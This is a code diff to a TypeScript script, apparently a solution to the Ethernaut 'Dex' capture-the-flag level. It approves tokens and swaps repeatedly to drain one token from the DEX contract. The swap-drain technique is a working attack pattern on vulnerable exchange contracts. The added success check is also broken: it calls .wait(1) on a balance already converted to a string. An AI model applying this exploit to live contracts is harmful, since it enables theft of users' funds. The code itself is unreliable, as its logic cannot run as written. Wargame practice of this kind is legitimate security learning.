@@ -15,6 +15,7 @@ const attackDex = async () => {
     // after swapping several times you'll see that you have more tokens
 
     // TODO: automate token address getting from contract
+    // TODO: fix conslusion below
     // experimental below to get token1 and token2 address
     // const provider = ethers.getDefaultProvider();
     // const token1Address = await provider.getStorageAt(dexAddress, 0);
@@ -32,13 +33,14 @@ const attackDex = async () => {
     // console.log(t2);
 
     const ABI = [
-        "function token1() public view returns (address);",
-        "function token2() public view returns (address);",
+        "function approve(address spender, uint amount)",
         "function swap(address from, address to, uint amount)",
         "function balanceOf(address token, address account)",
     ];
     const contractAttack = await ethers.getContractAt(ABI, dexAddress);
-    const tx = await contractAttack.approve(dexAddress, 500);
+    const approve = await contractAttack.approve(dexAddress, 500);
+    const approveReceipt = await approve.wait();
+    console.log(approveReceipt);
     // sample table below of continous swap
     // DEX       |        player
     // token1 - token2 | token1 - token2
@@ -61,6 +63,12 @@ const attackDex = async () => {
     const token1Balance = await contractAttack
         .balanceOf(token1Address, dexAddress)
         .then((v: any) => v.toString());
+    const token1BalanceReceipt = token1Balance.wait(1);
+    if (token1BalanceReceipt === "0") {
+        console.log("Token1 balance is 0, Level passed! submit to ethernaut");
+    } else {
+        console.log("Token1 balance is not 0, Level failed! review code above");
+    }
 };
 
 attackDex()
